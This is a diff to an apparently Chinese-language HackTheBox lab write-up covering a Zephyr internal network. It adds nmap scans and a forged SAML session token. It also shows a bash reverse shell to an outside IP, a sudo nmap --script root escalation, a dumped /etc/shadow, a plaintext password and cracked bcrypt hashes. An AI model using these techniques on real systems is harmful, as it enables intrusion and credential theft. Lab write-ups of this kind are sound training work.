@@ -49,9 +49,9 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 因为访问10.10.110.35浏览器会自动解析成`https://painters.htb/home`导致不能连接服务器，所以我们必须把域名和ip绑定，即hosts  -> 10.10.110.35 painters.htb
 :::
 vacancies
-![alt text](../../../images/dcd974d1753777a23a684d4dcedd47d4.png)
+
 发现可以上传pdf
-![alt text](../../../images/892ca35c0c7e15202d018de3551cb2a5.png)
+
 :::tip 
 经过Lamber提醒，所以知道bad-pdf钓鱼方法进行攻击
 :::
@@ -379,7 +379,7 @@ Powered by g0h4n from OpenCyber
 RustHound Enumeration Completed at 16:08:29 on 06/13/24! Happy Graphing!
 ```
 ### kerberoasting攻击
-![alt text](../../../images/image.png)
+
 #### GetUserspn获取spn和hash
 spn是服务主体名称
 ##### 获取spn
@@ -644,7 +644,7 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\James\Documents>
 ```
 ### 分析bloodhound
-![alt text](../../../images/image-1.png)
+
 #### ForceChangePassword
 首先需要使用evil-winrm(方便上传文件)登陆james
 上传PowerView.ps1
@@ -1002,3 +1002,299 @@ Approximate round trip times in milli-seconds:
     Minimum = 0ms, Maximum = 0ms, Average = 0ms
 ```
 ## 192.168.210.0/24(nmap)
+在域控上面发现log
+
+### 192.168.210.13(nmap/zephyr)
+```python
+riley@mail:~$ ./nmap 192.168.210.13
+Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2024-06-18 07:09 UTC
+Unable to find nmap-services!  Resorting to /etc/services
+Cannot find nmap-payloads. UDP payloads are disabled.
+Nmap scan report for 192.168.210.13
+Host is up (0.00061s latency).
+Not shown: 1166 filtered ports
+PORT      STATE  SERVICE
+53/tcp    closed domain
+80/tcp    closed http
+88/tcp    closed kerberos
+123/tcp   closed unknown
+135/tcp   closed epmap
+137/tcp   closed netbios-ns
+138/tcp   closed netbios-dgm
+139/tcp   closed netbios-ssn
+389/tcp   closed ldap
+443/tcp   open   https
+445/tcp   closed microsoft-ds
+464/tcp   closed kpasswd
+636/tcp   closed ldaps
+57000/tcp closed dircproxy
+60177/tcp closed tfido
+60179/tcp closed fido
+```
+#### 登陆https
+
+:::tip
+```
+只要更改为{"saml_data":{"username_attribute":"Admin"},"sessionid":"99c65fd664e1e0bb929d8a9d964f0a98","sign":"2cd21893210753d4d2926aa08fe7ebefdd41a8ab6413bb551ce048848b1dda44"}这样的就可以,越权登陆了
+eyJzYW1sX2RhdGEiOnsidXNlcm5hbWVfYXR0cmlidXRlIjoiQWRtaW4ifSwic2Vzc2lvbmlkIjoiOTljNjVmZDY2NGUxZTBiYjkyOWQ4YTlkOTY0ZjBhOTgiLCJzaWduIjoiMmNkMjE4OTMyMTA3NTNkNGQyOTI2YWEwOGZlN2ViZWZkZDQxYThhYjY0MTNiYjU1MWNlMDQ4ODQ4YjFkZGE0NCJ9
+```
+:::
+提权并反弹shell
+bash -c 'bash -i  >& /dev/tcp/192.168.110.51/445 0>&1'
+```python
+riley@mail:~$ su matt
+Password: L1f30f4Spr1ngCh1ck3n!
+matt@mail:/home/riley$ nc -lvnp 445
+nc: Permission denied
+matt@mail:/home/riley$ sudo nc -lvnp 445
+[sudo] password for matt: 
+Listening on 0.0.0.0 445
+Connection received on 192.168.210.13 39950
+bash: cannot set terminal process group (9475): Inappropriate ioctl for device
+bash: no job control in this shell
+zabbix@zephyr:/$ whoami
+whoami
+zabbix
+zabbix@zephyr:/$ sudo -l
+sudo -l
+Matching Defaults entries for zabbix on zephyr:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User zabbix may run the following commands on zephyr:
+    (root) NOPASSWD: /usr/bin/nmap
+zabbix@zephyr:/$ /usr/bin/nmap 192.168.210.13
+/usr/bin/nmap 192.168.210.13
+Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-18 07:24 UTC
+Nmap scan report for zephyr (192.168.210.13)
+Host is up (0.00012s latency).
+Not shown: 998 closed ports
+PORT    STATE SERVICE
+22/tcp  open  ssh
+443/tcp open  https
+
+Nmap done: 1 IP address (1 host up) scanned in 0.07 seconds
+zabbix@zephyr:/$
+```
+#### zephyr提权成功
+```python
+matt@mail:/home/riley$ sudo nc -lvnp 445
+Listening on 0.0.0.0 445
+Connection received on 192.168.210.13 40522
+bash: cannot set terminal process group (10210): Inappropriate ioctl for device
+bash: no job control in this shell
+zabbix@zephyr:/$ TF=$(mktemp)  
+TF=$(mktemp)
+zabbix@zephyr:/$ echo 'os.execute("/bin/bash")' > $TF
+echo 'os.execute("/bin/sh")' > $TF
+zabbix@zephyr:/$ sudo /usr/bin/nmap --script=$TF               
+sudo /usr/bin/nmap --script=$TF
+Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-18 07:44 UTC
+NSE: Warning: Loading '/tmp/tmp.XpVIiR1BOs' -- the recommended file extension is '.nse'.
+whoami
+root
+```
+#### cat /etc/shadow
+```python
+root:$6$6f6giSmZBJf/.sxX$lxLJK6FwdiiKgWo593xCjV0yi2U29AU5d2v2tYLrnN8AoBKswgvSuQwKiUhSb3nEcDa4sbMTu2N/TRd304bgg0:19334:0:99999:7:::
+daemon:*:18375:0:99999:7:::
+bin:*:18375:0:99999:7:::
+sys:*:18375:0:99999:7:::
+sync:*:18375:0:99999:7:::
+games:*:18375:0:99999:7:::
+man:*:18375:0:99999:7:::
+lp:*:18375:0:99999:7:::
+mail:*:18375:0:99999:7:::
+news:*:18375:0:99999:7:::
+uucp:*:18375:0:99999:7:::
+proxy:*:18375:0:99999:7:::
+www-data:*:18375:0:99999:7:::
+backup:*:18375:0:99999:7:::
+list:*:18375:0:99999:7:::
+irc:*:18375:0:99999:7:::
+gnats:*:18375:0:99999:7:::
+nobody:*:18375:0:99999:7:::
+systemd-network:*:18375:0:99999:7:::
+systemd-resolve:*:18375:0:99999:7:::
+systemd-timesync:*:18375:0:99999:7:::
+messagebus:*:18375:0:99999:7:::
+syslog:*:18375:0:99999:7:::
+_apt:*:18375:0:99999:7:::
+tss:*:18375:0:99999:7:::
+uuidd:*:18375:0:99999:7:::
+tcpdump:*:18375:0:99999:7:::
+landscape:*:18375:0:99999:7:::
+pollinate:*:18375:0:99999:7:::
+sshd:*:18389:0:99999:7:::
+systemd-coredump:!!:18389::::::
+lxd:!:18389::::::
+usbmux:*:18822:0:99999:7:::
+zabbix:!:19047:0:99999:7:::
+Debian-snmp:!:19047:0:99999:7:::
+mysql:!:19047:0:99999:7:::
+fwupd-refresh:*:19325:0:99999:7:::
+```
+#### 提升为交互式
+```python
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+```
+#### nmap扫描网段
+
+```
+/usr/bin/nmap -sU 192.168.210.0/24
+Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-18 14:42 UTC
+Nmap scan report for _gateway (192.168.210.1)
+Host is up (0.00061s latency).
+Not shown: 998 open|filtered ports
+PORT    STATE SERVICE
+53/udp  open  domain
+123/udp open  ntp
+MAC Address: 00:50:56:94:4C:CA (VMware)
+
+Nmap scan report for 192.168.210.10
+Host is up (0.00064s latency).
+Not shown: 996 open|filtered ports
+PORT    STATE SERVICE
+53/udp  open  domain
+123/udp open  ntp
+137/udp open  netbios-ns
+389/udp open  ldap
+MAC Address: 00:50:56:94:65:BD (VMware)
+
+Nmap scan report for 192.168.210.11
+Host is up (0.0025s latency).
+All 1000 scanned ports on 192.168.210.11 are open|filtered
+MAC Address: 00:50:56:94:21:32 (VMware)
+
+Nmap scan report for 192.168.210.12
+Host is up (0.0026s latency).
+All 1000 scanned ports on 192.168.210.12 are open|filtered
+MAC Address: 00:50:56:94:CA:C7 (VMware)
+
+Nmap scan report for 192.168.210.14
+Host is up (0.00034s latency).
+All 1000 scanned ports on 192.168.210.14 are open|filtered
+MAC Address: 00:50:56:94:E9:90 (VMware)
+
+Nmap scan report for 192.168.210.15
+Host is up (0.00033s latency).
+All 1000 scanned ports on 192.168.210.15 are open|filtered
+MAC Address: 00:50:56:94:3B:68 (VMware)
+
+Nmap scan report for 192.168.210.16
+Host is up (0.00053s latency).
+Not shown: 996 open|filtered ports
+PORT    STATE SERVICE
+53/udp  open  domain
+123/udp open  ntp
+137/udp open  netbios-ns
+389/udp open  ldap
+MAC Address: 00:50:56:94:01:ED (VMware)
+
+Nmap scan report for 192.168.210.17
+Host is up (0.00042s latency).
+All 1000 scanned ports on 192.168.210.17 are open|filtered
+MAC Address: 00:50:56:94:91:74 (VMware)
+
+Nmap scan report for 192.168.210.18
+Host is up (0.0027s latency).
+All 1000 scanned ports on 192.168.210.18 are open|filtered
+MAC Address: 00:50:56:94:14:FA (VMware)
+
+Nmap scan report for 192.168.210.19
+Host is up (0.0028s latency).
+All 1000 scanned ports on 192.168.210.19 are open|filtered
+MAC Address: 00:50:56:94:3A:C5 (VMware)
+
+Nmap scan report for zephyr (192.168.210.13)
+Host is up (0.0000070s latency).
+All 1000 scanned ports on zephyr (192.168.210.13) are closed
+
+Nmap done: 256 IP addresses (11 hosts up) scanned in 54.51 seconds
+```
+## 192.168.210.10(nmap)
+```python
+root@zephyr:/# nmap -sT -Pn -p- --min-rate="1000" 192.168.210.10 
+Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-18 15:33 UTC
+Nmap scan report for 192.168.210.10
+Host is up (0.00051s latency).
+Not shown: 65515 filtered ports
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+5985/tcp  open  wsman
+9389/tcp  open  adws
+49664/tcp open  unknown
+49668/tcp open  unknown
+54869/tcp open  unknown
+54873/tcp open  unknown
+54877/tcp open  unknown
+54885/tcp open  unknown
+54894/tcp open  unknown
+```
+```python
+mysql> select userid,username,surname,passwd from users;
++--------+----------+---------------+--------------------------------------------------------------+
+| userid | username | surname       | passwd                                                       |
++--------+----------+---------------+--------------------------------------------------------------+
+|      1 | Admin    | Administrator | $2y$10$BH90bGVo2lv948WpM1haruzrBgVCpzEL5av9BPCewd/Q2pM1Ybl.q |
+|      2 | guest    |               | $2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06 |
+|      5 | marcus   | Thompson      | $2y$10$dHMYveVV/xZoM5sc9cPHGe4xUukdyOM91C.LJ8TrpRQA3s1eXhm4. |
++--------+----------+---------------+--------------------------------------------------------------+
+3 rows in set (0.00 sec)
+
+┌──(root㉿Rookie)-[/home/rookie/Desktop]
+└─# echo '$2y$10$dHMYveVV/xZoM5sc9cPHGe4xUukdyOM91C.LJ8TrpRQA3s1eXhm4.' > aaa
+                                                                                                              
+┌──(root㉿Rookie)-[/home/rookie/Desktop]
+└─# john aaa --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 16 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+!QAZ2wsx         (?)     
+1g 0:00:00:37 DONE (2024-06-18 23:26) 0.02639g/s 368.7p/s 368.7c/s 368.7C/s goodman..bigbro
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+## 192.168.210.11(nmap)
+```python
+root@zephyr:/# nmap -sT -Pn -p- --min-rate="1000" 192.168.210.11
+Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-18 15:39 UTC
+Nmap scan report for 192.168.210.11
+Host is up (0.00066s latency).
+Not shown: 65531 filtered ports
+PORT      STATE SERVICE
+135/tcp   open  msrpc
+445/tcp   open  microsoft-ds
+5985/tcp  open  wsman
+49670/tcp open  unknown
+```
+## 192.168.210.12(nmap)
+```python
+Nmap done: 1 IP address (1 host up) scanned in 100.53 seconds
+root@zephyr:/# nmap -sT -Pn -p- --min-rate="1000" 192.168.210.12
+Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-18 15:48 UTC
+Nmap scan report for 192.168.210.12
+Host is up (0.00066s latency).
+Not shown: 65528 filtered ports
+PORT      STATE SERVICE
+80/tcp    open  http
+135/tcp   open  msrpc
+445/tcp   open  microsoft-ds
+5985/tcp  open  wsman
+49669/tcp open  unknown
+63320/tcp open  unknown
+63479/tcp open  unknown
+```
